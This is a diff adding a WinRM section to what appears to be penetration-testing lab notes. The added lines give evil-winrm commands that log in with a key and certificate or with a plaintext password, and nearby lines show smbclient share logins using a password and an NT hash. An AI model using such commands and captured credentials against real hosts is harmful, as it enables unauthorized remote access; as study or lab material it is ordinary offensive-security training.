@@ -512,8 +512,19 @@ smbclient //172.16.246.11/C$ -U medtech.com/joe%Password
 smbclient //192.168.212.248/transfer -U damon --pw-nt-hash 820d6348590813116884101357197052 -W relia.com
 ```
 
-\
+### WINRM
 
+Connect with key and certificate
+
+```bash
+$ evil-winrm -i timelapse.htb -S -k legacy_dev_auth.key -c legacy_dev_auth.cr
+```
+
+sometimes enabling ssl (-S) will to connect
+
+```bash
+$ evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+```
 
 ### SNMP
 
